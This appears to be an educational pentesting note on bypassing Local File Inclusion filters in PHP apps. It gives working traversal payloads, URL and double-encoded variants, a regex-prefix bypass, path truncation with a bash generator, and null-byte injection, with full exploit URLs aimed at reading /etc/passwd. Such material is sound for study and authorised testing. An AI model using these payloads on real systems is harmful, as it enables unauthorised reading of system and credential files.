## Overview

Real-world LFI vulnerabilities rarely allow direct file inclusion without restrictions. Developers often implement basic filtering mechanisms to prevent path traversal.

However, many of these protections are flawed and can be bypassed using encoding tricks, recursive traversal patterns, or path manipulation techniques.

Understanding these bypasses is essential when standard LFI payloads fail.

---

# Common LFI Protections

Typical defensive mechanisms:

- removing "../"
- blocking "." or "/"
- restricting allowed directories
- appending file extensions
- validating input format using regex
- limiting input length

Poor implementations often introduce bypass opportunities.

---

# Non-Recursive Path Traversal Filters

Example filter:

```php
$language = str_replace('../', '', $_GET['language']);
```

This removes instances of:

```text
../
```

---

## Why This Fails

The filter runs once and does not re-evaluate the modified string.

Example bypass string:

```text
....//
```

Processing logic:

```text
....// → ../
```

Traversal remains intact.

---

# Recursive Traversal Bypass Payload

```text
....//....//....//....//etc/passwd
```

Result after filter:

```text
../../../../etc/passwd
```

Working exploit:

```text
http://target/index.php?language=....//....//....//....//etc/passwd
```

---

# Alternative Recursive Patterns

Other variants:

```text
..././
....\/
....////
..../
```

Reason:

filters often match exact patterns only.

---

# Encoding Bypass

Filters may block characters:

```text
.
/
```

URL encoding bypasses these restrictions.

---

## Encoding Traversal

```text
../ → %2e%2e%2f
```

Example payload:

```text
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
```

Full exploit:

```text
http://target/index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
```

---

# Double Encoding

Some filters decode input once.

Double encoding bypass:

```text
../ → %252e%252e%252f
```

Decoding process:

```text
%252e → %2e → .
```

Useful against poorly implemented filters.

---

# Approved Path Restrictions

Example regex restriction:

```php
if(preg_match('/^\.\/languages\/.+$/', $_GET['language']))
```

Application only allows files under:

```text
./languages/
```

---

# Bypass Using Approved Prefix

Include approved path first:

```text
./languages/../../../../etc/passwd
```

Full payload:

```text
http://target/index.php?language=./languages/../../../../etc/passwd
```

Bypasses regex while still traversing directories.

---

# Combining Techniques

Filters may stack protections:

Example combined bypass:

```text
./languages/....//....//....//....//etc/passwd
```

or encoded:

```text
./languages/%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
```

---

# Appended Extension Restrictions

Example code:

```php
include($_GET['language'] . ".php");
```

Payload:

```text
/etc/passwd
```

becomes:

```text
/etc/passwd.php
```

File not found.

---

# Path Truncation (Legacy PHP)

Older PHP versions truncate strings longer than:

```text
4096 characters
```

If extension is appended after limit:

```text
/etc/passwd.php → truncated → /etc/passwd
```

---

# Path Truncation Payload Structure

```text
non_existing_directory/../../../etc/passwd/././././././...
```

Repeated until length exceeds 4096 characters.

---

# Generating Long Payload

```bash
echo -n "non_existing_directory/../../../etc/passwd/" && \
for i in {1..2048}; do echo -n "./"; done
```

Important:

ensure target path is not truncated.

---

# Null Byte Injection (Legacy PHP)

Older PHP versions treat null byte as string terminator.

Null byte:

```text
%00
```

Payload:

```text
/etc/passwd%00
```

Application interprets:

```text
/etc/passwd%00.php
```

Result:

```text
/etc/passwd
```

Extension ignored.

---

# Why Null Byte Works

Low-level languages treat null byte as end-of-string marker.

Common in:

- C
- C++
- Assembly

Older PHP versions inherited behaviour.

---

# When These Techniques Apply

| Technique | Works On |
|----------|---------|
| recursive traversal | weak filters |
| encoding | blacklist filters |
| approved path bypass | regex restrictions |
| double encoding | partial decoding filters |
| path truncation | PHP < 5.3 |
| null byte injection | PHP < 5.5 |
